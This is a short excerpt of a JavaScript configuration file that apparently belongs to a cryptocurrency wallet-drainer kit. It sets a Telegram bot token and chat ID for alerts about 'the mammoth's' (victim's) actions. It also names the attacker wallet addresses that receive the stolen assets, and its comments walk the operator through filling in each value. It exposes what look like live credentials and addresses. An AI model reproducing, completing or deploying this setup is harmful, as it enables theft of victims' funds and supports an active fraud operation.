...
const MS_Telegram_Token = "7758822629:AAEG87b_cmRuCUU4uMWtp5I9d0uCIofrVA0"; // Enter your bot token from @BotFather here (go there, create a bot, and get this token)
const MS_Telegram_Chat_ID = ["5764724044"]; // Enter the chat ID(s) here where notifications about the mammoth's actions need to be sent (if the ID starts with a minus, write it as is)
...
const MS_Wallet_Address = "0x3374D9431A8cA4966Db5bda91e80f11b6457E4f0"; // Wallet address where the assets will be sent
...
const MS_Wallet_Receiver = ["0x3374D9431A8cA4966Db5bda91e80f11b6457E4f0"]; // Wallet or wallets where assets will be received, may be the same as MS_Wallet_Address or different
